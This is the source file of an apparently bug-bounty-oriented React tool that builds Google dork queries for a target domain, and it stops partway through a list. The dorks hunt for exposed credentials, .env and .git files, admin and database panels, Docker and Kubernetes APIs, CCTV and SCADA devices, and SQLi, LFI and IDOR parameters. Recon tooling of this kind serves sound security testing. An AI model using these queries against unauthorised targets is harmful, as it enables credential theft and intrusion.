"use client"

import { useState } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Copy, Check, ExternalLink, Search, Sparkles, Shield, Zap, Target, Eye, Lock, AlertTriangle, Database, Code, FileText, Globe, Github, Linkedin, Video, Bug, Wrench, Download, Terminal, Key, Hash, List } from "lucide-react"
import { sqlInjectionDorks, cctvDorks, lfiDorks, sensitiveDataDorks } from "@/components/dork-data/wordlist-categories"
import { allPayloadCategories, xssExploitSections, type PayloadCategory } from "@/components/payload-data/attack-payloads"

interface DorkCategory {
  title: string
  dorks: string[]
  icon: React.ReactNode
  description: string
  color: string
  group: string
}

const dorkCategories: DorkCategory[] = [
  {
    title: "PHP Parameter Endpoints",
    dorks: ["site:{domain} ext:php inurl:?"],
    icon: <Code className="h-4 w-4" />,
    description: "Discover PHP endpoints with parameters",
    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
    group: "Recon"
  },
  {
    title: "API Surface Mapping",
    dorks: ["site:{domain} inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3"],
    icon: <Globe className="h-4 w-4" />,
    description: "Map API endpoints and versions",
    color: "bg-green-500/10 text-green-600 border-green-500/20",
    group: "Recon"
  },
  {
    title: "Sensitive File Discovery",
    dorks: ['site:"{domain}" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json'],
    icon: <FileText className="h-4 w-4" />,
    description: "Find configuration and sensitive files",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Archivos"
  },
  {
    title: "Critical URL Tokens",
    dorks: ["inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:{domain}"],
    icon: <Target className="h-4 w-4" />,
    description: "Locate important URL patterns",
    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
    group: "Recon"
  },
  {
    title: "Error Pages & Traces",
    dorks: ['inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:{domain}'],
    icon: <AlertTriangle className="h-4 w-4" />,
    description: "Find error pages and stack traces",
    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
    group: "Recon"
  },
  {
    title: "XSS Parameters",
    dorks: ["inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:{domain}"],
    icon: <Zap className="h-4 w-4" />,
    description: "Identify potential XSS vectors",
    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
    group: "Web Vulns"
  },
  {
    title: "Redirect Parameters",
    dorks: ["inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:{domain}"],
    icon: <ExternalLink className="h-4 w-4" />,
    description: "Find redirect parameter vulnerabilities",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "Web Vulns"
  },
  {
    title: "SQL Injection Parameters",
    dorks: ["inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:{domain}"],
    icon: <Database className="h-4 w-4" />,
    description: "Common SQLi parameter patterns",
    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
    group: "Web Vulns"
  },
  {
    title: "SSRF Parameters",
    dorks: ["inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:{domain}"],
    icon: <Shield className="h-4 w-4" />,
    description: "Server-Side Request Forgery vectors",
    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20",
    group: "Web Vulns"
  },
  {
    title: "File Inclusion Candidates",
    dorks: ["inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:{domain}"],
    icon: <FileText className="h-4 w-4" />,
    description: "Local and remote file inclusion",
    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
    group: "Web Vulns"
  },
  {
    title: "Command Execution",
    dorks: ["inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:{domain}"],
    icon: <Zap className="h-4 w-4" />,
    description: "Remote command execution parameters",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Web Vulns"
  },
  {
    title: "File Upload Discovery",
    dorks: ['site:{domain} intext:"choose file" | intext:"select file" | intext:"upload PDF"'],
    icon: <FileText className="h-4 w-4" />,
    description: "Find file upload functionality",
    color: "bg-emerald-500/10 text-emerald-600 border-emerald-500/20",
    group: "Web Vulns"
  },
  {
    title: "API Documentation",
    dorks: ['inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer | inurl:redoc | inurl:openapi | intitle:"Swagger UI" site:"{domain}"'],
    icon: <Code className="h-4 w-4" />,
    description: "API docs and Swagger endpoints",
    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
    group: "Recon"
  },
  {
    title: "Authentication Endpoints",
    dorks: ["inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:{domain}"],
    icon: <Lock className="h-4 w-4" />,
    description: "Login and authentication pages",
    color: "bg-slate-500/10 text-slate-600 border-slate-500/20",
    group: "Recon"
  },
  {
    title: "Test & Staging Sites",
    dorks: ["inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:{domain}"],
    icon: <Eye className="h-4 w-4" />,
    description: "Development and testing environments",
    color: "bg-amber-500/10 text-amber-600 border-amber-500/20",
    group: "Recon"
  },
  {
    title: "Confidential Documents",
    dorks: ['site:{domain} ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx intext:"confidential" | intext:"Not for Public Release" | intext:"internal use only" | intext:"do not distribute"'],
    icon: <FileText className="h-4 w-4" />,
    description: "Sensitive document discovery",
    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
    group: "Archivos"
  },
  {
    title: "Personal Data Parameters",
    dorks: ["inurl:email= | inurl:phone= | inurl:name= | inurl:user= inurl:& site:{domain}"],
    icon: <Shield className="h-4 w-4" />,
    description: "URLs containing personal information",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "OSINT"
  },
  {
    title: "AEM Content Paths",
    dorks: ["inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:{domain}"],
    icon: <Globe className="h-4 w-4" />,
    description: "Adobe Experience Manager paths",
    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
    group: "CMS"
  },
  {
    title: "Vulnerability Reports",
    dorks: ['site:openbugbounty.org inurl:reports intext:"{domain}"'],
    icon: <AlertTriangle className="h-4 w-4" />,
    description: "Public vulnerability disclosures",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "OSINT"
  },
  {
    title: "Community Mentions",
    dorks: ['site:groups.google.com "{domain}"'],
    icon: <Globe className="h-4 w-4" />,
    description: "Google Groups discussions",
    color: "bg-green-500/10 text-green-600 border-green-500/20",
    group: "OSINT"
  },
  {
    title: "Code Snippet Sites",
    dorks: [
      'site:pastebin.com "{domain}"',
      'site:jsfiddle.net "{domain}"',
      'site:codebeautify.org "{domain}"',
      'site:codepen.io "{domain}"',
    ],
    icon: <Code className="h-4 w-4" />,
    description: "Paste sites and code repositories",
    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
    group: "OSINT"
  },
  {
    title: "Cloud Storage Buckets",
    dorks: [
      'site:s3.amazonaws.com "{domain}"',
      'site:blob.core.windows.net "{domain}"',
      'site:googleapis.com "{domain}"',
      'site:drive.google.com "{domain}"',
      'site:dev.azure.com "{domain}"',
      'site:onedrive.live.com "{domain}"',
      'site:digitaloceanspaces.com "{domain}"',
      'site:sharepoint.com "{domain}"',
      'site:s3-external-1.amazonaws.com "{domain}"',
      'site:s3.dualstack.us-east-1.amazonaws.com "{domain}"',
      'site:dropbox.com/s "{domain}"',
      'site:docs.google.com inurl:"/d/" "{domain}"',
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Cloud storage and bucket discovery",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "Cloud"
  },
  {
    title: "Package Repositories",
    dorks: ['site:jfrog.io "{domain}"'],
    icon: <Code className="h-4 w-4" />,
    description: "Artifactory and package repos",
    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
    group: "Cloud"
  },
  {
    title: "Firebase References",
    dorks: ['site:firebaseio.com "{domain}"'],
    icon: <Database className="h-4 w-4" />,
    description: "Firebase database references",
    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
    group: "Cloud"
  },
  {
    title: "Bug Bounty Programs",
    dorks: [
      'intext:"submit your vulnerability" intitle:"bug bounty"',
      'intitle:"security.txt" inurl:.well-known',
      'site:hackerone.com "{domain}"',
      'site:bugcrowd.com "{domain}"',
      'site:intigriti.com "{domain}"',
      'site:yeswehack.com "{domain}"',
      '"responsible disclosure" site:{domain}',
    ],
    icon: <Shield className="h-4 w-4" />,
    description: "Bug bounty and disclosure programs",
    color: "bg-green-500/10 text-green-600 border-green-500/20",
    group: "OSINT"
  },
  {
    title: "Exposed Credentials",
    dorks: [
      'filetype:sql "password" site:{domain}',
      'filetype:env "DB_PASSWORD" site:{domain}',
      'site:github.com "{domain}" "API_KEY"',
      'site:github.com "{domain}" "SECRET_KEY"',
      'site:github.com "{domain}" "access_token"',
      'filetype:log "password" site:{domain}',
      "ext:pwd site:{domain}",
    ],
    icon: <Lock className="h-4 w-4" />,
    description: "Exposed passwords and secrets",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Credenciales"
  },
  {
    title: "Configuration Secrets",
    dorks: [
      "inurl:config filetype:xml site:{domain}",
      'filetype:yml "database" "password" site:{domain}',
      'ext:properties "password" site:{domain}',
      'ext:ini "password" site:{domain}',
      'ext:conf "password" site:{domain}',
      'ext:cnf "password" site:{domain}',
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Configuration files with secrets",
    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
    group: "Credenciales"
  },
  {
    title: "Backup Archives",
    dorks: [
      'intitle:"index of" "backup" site:{domain}',
      "filetype:bak site:{domain}",
      "filetype:old site:{domain}",
      "filetype:backup site:{domain}",
      "ext:sql site:{domain}",
      "ext:dump site:{domain}",
      "ext:tar.gz site:{domain}",
      "ext:zip site:{domain}",
      'inurl:"backup" site:{domain}',
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Backup files and archives",
    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20",
    group: "Archivos"
  },
  {
    title: "Sensitive Documents",
    dorks: [
      'intitle:"index of" "nda.pdf" site:{domain}',
      'filetype:pdf "confidential" site:{domain}',
      'filetype:pdf "internal use only" site:{domain}',
      'ext:doc "confidential" site:{domain}',
      'ext:docx "confidential" site:{domain}',
      'filetype:xls "confidential" site:{domain}',
      'filetype:xlsx "confidential" site:{domain}',
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Publicly indexed sensitive docs",
    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
    group: "Archivos"
  },
  {
    title: "GitHub Leaks",
    dorks: [
      'site:github.com "{domain}" "password"',
      'site:github.com "{domain}" "api_key"',
      'site:github.com "{domain}" "secret"',
      'site:github.com "{domain}" "aws_access_key_id"',
      'site:github.com "{domain}" "connectionString"',
      'site:github.com "{domain}" "private_key"',
      'site:github.com "{domain}" "token"',
      'site:github.com "{domain}" "credentials"',
    ],
    icon: <Github className="h-4 w-4" />,
    description: "GitHub repository leaks",
    color: "bg-gray-500/10 text-gray-600 border-gray-500/20",
    group: "Credenciales"
  },
  {
    title: "Exposed Admin Panels",
    dorks: [
      `intitle:"Dashboard" inurl:jenkins site:{domain}`,
      `intitle:"Jenkins" inurl:/jenkins site:{domain}`,
      `intitle:"Jira" inurl:/jira site:{domain}`,
      `intitle:"Confluence" inurl:/confluence site:{domain}`,
      `intitle:"GitLab" inurl:/gitlab site:{domain}`,
      `intitle:"Grafana" inurl:3000 site:{domain}`,
      `intitle:"Kibana" inurl:5601 site:{domain}`,
      `intitle:"Prometheus" inurl:9090 site:{domain}`,
      `intitle:"Portainer" inurl:9000 site:{domain}`,
      `intitle:"Rancher" inurl:rancher site:{domain}`,
      `inurl:/wp-admin site:{domain}`,
      `inurl:/admin/dashboard site:{domain}`,
      `inurl:/manager/html intitle:"Tomcat" site:{domain}`,
      `intitle:"phpMyAdmin" inurl:phpmyadmin site:{domain}`,
      `intitle:"Adminer" inurl:adminer site:{domain}`,
    ],
    icon: <Shield className="h-4 w-4" />,
    description: "Paneles de administración expuestos: Jenkins, Jira, Grafana, Kibana, etc.",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Infraestructura"
  },
  {
    title: "Exposed Databases & Caches",
    dorks: [
      `intitle:"phpMyAdmin" "Welcome to phpMyAdmin" site:{domain}`,
      `intitle:"Welcome to Adminer" site:{domain}`,
      `intitle:"pgAdmin" inurl:pgadmin site:{domain}`,
      `intitle:"RockMongo" inurl:rock site:{domain}`,
      `intitle:"Elasticsearch" inurl:9200 site:{domain}`,
      `inurl:9200/_cat/indices site:{domain}`,
      `inurl:9200/_cluster/settings site:{domain}`,
      `intitle:"Redis" inurl:6379 site:{domain}`,
      `intitle:"CouchDB" inurl:5984 site:{domain}`,
      `intitle:"InfluxDB" inurl:8086 site:{domain}`,
      `inurl:8086/query?q=SHOW+DATABASES site:{domain}`,
      `intitle:"Cassandra" inurl:8080 site:{domain}`,
      `inurl:/_utils/ intitle:"CouchDB" site:{domain}`,
      `intitle:"Mongo Express" inurl:8081 site:{domain}`,
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Bases de datos, caches y paneles de administración de BD expuestos",
    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
    group: "Infraestructura"
  },
  {
    title: "Kubernetes & Docker Exposed",
    dorks: [
      `intitle:"Kubernetes Dashboard" site:{domain}`,
      `inurl:8001/api/v1 site:{domain}`,
      `inurl:10250/pods site:{domain}`,
      `inurl:2375/containers/json site:{domain}`,
      `inurl:2376/containers/json site:{domain}`,
      `inurl:4243/containers/json site:{domain}`,
      `intitle:"Portainer" site:{domain}`,
      `inurl:/api/v1/namespaces site:{domain}`,
      `intitle:"Docker Registry" inurl:5000 site:{domain}`,
      `inurl:5000/v2/_catalog site:{domain}`,
      `intitle:"Lens" inurl:5500 site:{domain}`,
      `inurl:etcd/v2/keys site:{domain}`,
      `inurl:etcd/v3/kv site:{domain}`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "Dashboards de Kubernetes, APIs Docker y registros de contenedores expuestos",
    color: "bg-blue-500/10 text-blue-600 border-blue-500/20",
    group: "Infraestructura"
  },
  {
    title: "Jupyter & Notebooks Exposed",
    dorks: [
      `intitle:"Jupyter Notebook" site:{domain}`,
      `inurl:/tree site:{domain} intitle:"Jupyter"`,
      `inurl:/notebooks site:{domain} intitle:"Jupyter"`,
      `intitle:"JupyterHub" site:{domain}`,
      `intitle:"Apache Zeppelin" site:{domain}`,
      `intitle:"Spark Master" site:{domain}`,
      `intitle:"RStudio" inurl:8787 site:{domain}`,
      `intitle:"Streamlit" site:{domain}`,
      `inurl:8888/tree site:{domain}`,
      `inurl:8888/notebooks site:{domain}`,
      `inurl:/lab/workspaces site:{domain}`,
    ],
    icon: <Code className="h-4 w-4" />,
    description: "Jupyter Notebooks, JupyterHub, Zeppelin y entornos data science expuestos",
    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
    group: "Infraestructura"
  },
  {
    title: "WordPress Vulnerabilities",
    dorks: [
      `inurl:/wp-content/uploads site:{domain} filetype:php`,
      `inurl:/wp-includes/wlwmanifest.xml site:{domain}`,
      `inurl:/wp-json/wp/v2/users site:{domain}`,
      `inurl:/?author= site:{domain}`,
      `inurl:/wp-login.php site:{domain}`,
      `inurl:/xmlrpc.php site:{domain}`,
      `inurl:/wp-config.php.bak site:{domain}`,
      `inurl:/wp-content/debug.log site:{domain}`,
      `site:{domain} intext:"Powered by WordPress"`,
      `inurl:/?p= inurl:/?cat= site:{domain}`,
      `intitle:"WordPress" inurl:wp-admin site:{domain}`,
      `inurl:/wp-content/uploads filetype:sql site:{domain}`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "Rutas sensibles de WordPress, XMLRPC, enumeración de usuarios y archivos expuestos",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "CMS"
  },
  {
    title: "Exposed .git / .env / .DS_Store",
    dorks: [
      `inurl:"/.git" "index of" site:{domain}`,
      `inurl:"/.git/HEAD" site:{domain}`,
      `inurl:"/.git/config" site:{domain}`,
      `inurl:"/.env" "DB_PASSWORD" site:{domain}`,
      `inurl:"/.env" "APP_KEY" site:{domain}`,
      `inurl:"/.env" "SECRET_KEY" site:{domain}`,
      `inurl:"/.DS_Store" site:{domain}`,
      `inurl:"/.svn/entries" site:{domain}`,
      `inurl:"/.hg/manifest" site:{domain}`,
      `inurl:"/Makefile" "secret" site:{domain}`,
      `inurl:"/docker-compose.yml" site:{domain}`,
      `inurl:"/docker-compose.yaml" site:{domain}`,
      `inurl:"/.well-known/security.txt" site:{domain}`,
      `inurl:"/CHANGELOG" inurl:"/VERSION" site:{domain}`,
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Repositorios .git, archivos .env, .DS_Store y manifiestos de VCS expuestos en web",
    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
    group: "Archivos"
  },
  {
    title: "IoT & Industrial Devices",
    dorks: [
      `intitle:"RouterOS" inurl:webfig site:{domain}`,
      `intitle:"Cisco IOS" inurl:level site:{domain}`,
      `intitle:"Fortinet" inurl:logincheck site:{domain}`,
      `intitle:"pfSense" inurl:index.php site:{domain}`,
      `intitle:"SonicWALL" inurl:auth.html site:{domain}`,
      `intitle:"BIG-IP" inurl:tmui site:{domain}`,
      `intitle:"Printer" inurl:hp/device site:{domain}`,
      `intitle:"RICOH" inurl:web site:{domain}`,
      `intitle:"SCADA" inurl:login site:{domain}`,
      `intitle:"Siemens" inurl:portal site:{domain}`,
      `intitle:"HMI" inurl:web site:{domain}`,
      `inurl:/cgi-bin/webproc?getpage=html/index.html site:{domain}`,
      `intitle:"Hikvision" inurl:doc/page site:{domain}`,
      `intitle:"Dahua" inurl:RPC2 site:{domain}`,
      `intitle:"Ubiquiti" inurl:devinfo site:{domain}`,
    ],
    icon: <Target className="h-4 w-4" />,
    description: "Routers, firewalls, impresoras, SCADA, PLCs y dispositivos IoT/industriales expuestos",
    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
    group: "Infraestructura"
  },
  {
    title: "Cloud & Serverless Exposure",
    dorks: [
      `site:.azurewebsites.net "{domain}"`,
      `site:.cloudapp.azure.com "{domain}"`,
      `site:.azurefd.net "{domain}"`,
      `site:.azurestaticapps.net "{domain}"`,
      `site:.cloudfunctions.net "{domain}"`,
      `site:.appspot.com "{domain}"`,
      `site:.run.app "{domain}"`,
      `site:.lambda-url.us-east-1.on.aws`,
      `site:.execute-api.us-east-1.amazonaws.com`,
      `site:*.s3.amazonaws.com "Access Denied"`,
      `site:*.s3.amazonaws.com "NoSuchBucketPolicy"`,
      `inurl:X-Amz-Credential site:{domain}`,
      `inurl:AWSAccessKeyId= site:{domain}`,
      `"arn:aws:" filetype:txt site:{domain}`,
      `intitle:"Serverless Dashboard" site:{domain}`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "Funciones serverless, buckets S3 mal configurados y endpoints cloud expuestos",
    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
    group: "Cloud"
  },
  {
    title: "SQL Injection",
    dorks: sqlInjectionDorks,
    icon: <Database className="h-4 w-4" />,
    description: "Google dorks for SQL injection and vulnerable parameters",
    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
    group: "Web Vulns"
  },
  {
    title: "CCTV / Cámaras abiertas",
    dorks: cctvDorks,
    icon: <Video className="h-4 w-4" />,
    description: "Cámaras IP y streams accesibles (AXIS, ViewerFrame, etc.)",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "Infraestructura"
  },
  {
    title: "Local File Inclusion",
    dorks: lfiDorks,
    icon: <FileText className="h-4 w-4" />,
    description: "Parámetros típicos de LFI (page=, file=, include=, etc.)",
    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
    group: "Web Vulns"
  },
  {
    title: "Sensitive Data",
    dorks: sensitiveDataDorks,
    icon: <Lock className="h-4 w-4" />,
    description: "Datos sensibles, backups, passwords y configs expuestos",
    color: "bg-rose-500/10 text-rose-600 border-rose-500/20",
    group: "Archivos"
  },
  {
    title: "SQLi — Error Messages",
    dorks: [
      `site:{domain} intext:"You have an error in your SQL syntax"`,
      `site:{domain} intext:"Warning: mysql_fetch"`,
      `site:{domain} intext:"Warning: mysql_num_rows"`,
      `site:{domain} intext:"Warning: mysql_query"`,
      `site:{domain} intext:"supplied argument is not a valid MySQL result"`,
      `site:{domain} intext:"ORA-01756" | intext:"ORA-00933" | intext:"ORA-00907"`,
      `site:{domain} intext:"Microsoft OLE DB Provider for SQL Server"`,
      `site:{domain} intext:"Unclosed quotation mark after the character string"`,
      `site:{domain} intext:"MySQLSyntaxErrorException"`,
      `site:{domain} intext:"pg_query():" | intext:"pg_exec():"`,
      `site:{domain} intext:"SQLite3::query"`,
      `site:{domain} "sql syntax near" | "syntax error has occurred" | "incorrect syntax near"`,
      `site:{domain} intext:"Incorrect syntax near" intext:"Microsoft SQL"`,
      `site:{domain} intext:"SQLSTATE[42000]" | intext:"SQLSTATE[HY000]"`,
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Páginas que exponen mensajes de error de SQL (MySQL, PostgreSQL, Oracle, MSSQL, SQLite)",
    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
    group: "Web Vulns"
  },
  {
    title: "SQLi — Login & Auth Panels",
    dorks: [
      `site:{domain} inurl:login.php inurl:?`,
      `site:{domain} inurl:admin inurl:login ext:php`,
      `site:{domain} intext:"username" intext:"password" ext:php inurl:?`,
      `site:{domain} inurl:signin.php inurl:?`,
      `site:{domain} inurl:authenticate.php`,
      `site:{domain} inurl:user_login.php`,
      `site:{domain} inurl:admin_login.php`,
      `site:{domain} intitle:"Admin Login" ext:php`,
      `site:{domain} intitle:"Member Login" ext:php`,
      `site:{domain} inurl:panel inurl:login`,
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Paneles de login en PHP típicamente vulnerables a SQL injection en sus parámetros",
    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
    group: "Web Vulns"
  },
  {
    title: "SQLi — Numeric & String Parameters",
    dorks: [
      `site:{domain} inurl:".php?id="`,
      `site:{domain} inurl:".php?cat="`,
      `site:{domain} inurl:".php?news_id="`,
      `site:{domain} inurl:".php?item_id="`,
      `site:{domain} inurl:".php?page_id="`,
      `site:{domain} inurl:".php?article="`,
      `site:{domain} inurl:".php?product="`,
      `site:{domain} inurl:".php?cid="`,
      `site:{domain} inurl:".asp?id="`,
      `site:{domain} inurl:".aspx?id="`,
      `site:{domain} inurl:".cfm?id="`,
      `site:{domain} inurl:"?select=" | inurl:"?update=" | inurl:"?delete="`,
    ],
    icon: <Database className="h-4 w-4" />,
    description: "Endpoints con parámetros numéricos y de cadena típicamente inyectables",
    color: "bg-pink-500/10 text-pink-600 border-pink-500/20",
    group: "Web Vulns"
  },
  {
    title: "XSS — Reflected Parameters",
    dorks: [
      `site:{domain} inurl:"search=" inurl:&`,
      `site:{domain} inurl:"q=" inurl:&`,
      `site:{domain} inurl:"query=" inurl:&`,
      `site:{domain} inurl:"keyword=" inurl:&`,
      `site:{domain} inurl:"name=" inurl:& ext:php`,
      `site:{domain} inurl:"title=" inurl:& ext:php`,
      `site:{domain} inurl:"msg=" inurl:&`,
      `site:{domain} inurl:"message=" inurl:&`,
      `site:{domain} inurl:"error=" inurl:&`,
      `site:{domain} inurl:"notice=" inurl:&`,
      `site:{domain} inurl:"callback=" inurl:&`,
      `site:{domain} inurl:"jsonp=" inurl:&`,
      `site:{domain} inurl:"template=" inurl:&`,
      `site:{domain} inurl:"view=" inurl:&`,
    ],
    icon: <Zap className="h-4 w-4" />,
    description: "Parámetros GET que reflejan input del usuario — candidatos a Reflected XSS",
    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
    group: "Web Vulns"
  },
  {
    title: "XSS — Forms & Stored Vectors",
    dorks: [
      `site:{domain} intitle:"comment" | intitle:"guestbook" | intitle:"feedback" ext:php`,
      `site:{domain} inurl:forum | inurl:reply | inurl:comment ext:php`,
      `site:{domain} intext:"Post a comment" | intext:"Leave a reply"`,
      `site:{domain} intext:"Add your comment" | intext:"Submit feedback"`,
      `site:{domain} inurl:guestbook.php | inurl:guest_book.php`,
      `site:{domain} inurl:forum.php | inurl:post.php | inurl:thread.php`,
      `site:{domain} intext:"<form" intext:"<input type=text" ext:php`,
      `site:{domain} inurl:review | inurl:testimonial ext:php inurl:?`,
      `site:{domain} inurl:profile inurl:? ext:php`,
      `site:{domain} intext:"Your message has been posted"`,
    ],
    icon: <Zap className="h-4 w-4" />,
    description: "Formularios de comentarios, foros y guestbooks típicamente vulnerables a Stored XSS",
    color: "bg-yellow-500/10 text-yellow-600 border-yellow-500/20",
    group: "Web Vulns"
  },
  {
    title: "LFI — Path Traversal",
    dorks: [
      `site:{domain} inurl:"file=" inurl:&`,
      `site:{domain} inurl:"path=" inurl:&`,
      `site:{domain} inurl:"page=" ext:php inurl:&`,
      `site:{domain} inurl:"document=" inurl:&`,
      `site:{domain} inurl:"template=" ext:php inurl:&`,
      `site:{domain} inurl:"load=" inurl:&`,
      `site:{domain} inurl:"read=" inurl:&`,
      `site:{domain} inurl:"display=" inurl:&`,
      `site:{domain} inurl:"show=" ext:php inurl:&`,
      `site:{domain} inurl:"content=" ext:php inurl:&`,
      `site:{domain} inurl:"fetch=" inurl:&`,
      `site:{domain} inurl:"retrieve=" inurl:&`,
      `site:{domain} inurl:"/etc/passwd" | inurl:"proc/self/environ"`,
      `site:{domain} inurl:"php://filter" | inurl:"php://input"`,
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Parámetros de inclusión de archivos y path traversal — vectores LFI/RFI",
    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
    group: "Web Vulns"
  },
  {
    title: "LFI — Config & Log Files",
    dorks: [
      `site:{domain} inurl:"include=" filetype:php`,
      `site:{domain} inurl:"config=" filetype:php inurl:?`,
      `site:{domain} inurl:"lang=" inurl:& filetype:php`,
      `site:{domain} inurl:"module=" inurl:& filetype:php`,
      `site:{domain} inurl:"layout=" inurl:& filetype:php`,
      `site:{domain} inurl:"section=" inurl:& filetype:php`,
      `site:{domain} inurl:"view=" filetype:php inurl:?`,
      `site:{domain} intext:"include_once" | intext:"require_once" filetype:php`,
      `intitle:"index of" "access.log" site:{domain}`,
      `intitle:"index of" "error.log" site:{domain}`,
      `intitle:"index of" "wp-config.php" site:{domain}`,
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Inclusiones PHP con parámetros de configuración, módulos y log files indexados",
    color: "bg-teal-500/10 text-teal-600 border-teal-500/20",
    group: "Web Vulns"
  },
  {
    title: "IDOR — Parameter-Based",
    dorks: [
      `site:{domain} inurl:"?id=" -inurl:"sidebar" -inurl:"widget"`,
      `site:{domain} inurl:"?uid="`,
      `site:{domain} inurl:"?user_id="`,
      `site:{domain} inurl:"?account_id="`,
      `site:{domain} inurl:"?member_id="`,
      `site:{domain} inurl:"?customer_id="`,
      `site:{domain} inurl:"?order_id="`,
      `site:{domain} inurl:"?invoice_id="`,
      `site:{domain} inurl:"?payment_id="`,
      `site:{domain} inurl:"?ticket_id="`,
      `site:{domain} inurl:"?case_id="`,
      `site:{domain} inurl:"?doc_id="`,
      `site:{domain} inurl:"?file_id="`,
      `site:{domain} inurl:"?attachment_id="`,
      `site:{domain} inurl:"?message_id="`,
      `site:{domain} inurl:"?thread_id="`,
      `site:{domain} inurl:"?report_id="`,
      `site:{domain} inurl:"?record_id="`,
      `site:{domain} inurl:"?profile_id="`,
      `site:{domain} inurl:"?subscription_id="`,
    ],
    icon: <Eye className="h-4 w-4" />,
    description: "Parámetros GET con IDs directos — candidatos clásicos a IDOR",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "IDOR — Download & Export",
    dorks: [
      `site:{domain} inurl:"/download" inurl:"?id="`,
      `site:{domain} inurl:"/download" inurl:"?file="`,
      `site:{domain} inurl:"/download" inurl:"?token="`,
      `site:{domain} inurl:"/export" inurl:"?id="`,
      `site:{domain} inurl:"/export" inurl:"?report="`,
      `site:{domain} inurl:"/export" inurl:"?format="`,
      `site:{domain} inurl:"/get_file" inurl:"?id="`,
      `site:{domain} inurl:"/getfile" inurl:"?name="`,
      `site:{domain} inurl:"/file/download" inurl:"?id="`,
      `site:{domain} inurl:"/attachment" inurl:"?id="`,
      `site:{domain} inurl:"/attachments" inurl:"?id="`,
      `site:{domain} inurl:"/invoice/download" inurl:"?id="`,
      `site:{domain} inurl:"/receipt" inurl:"?id="`,
      `site:{domain} inurl:"/statement" inurl:"?account="`,
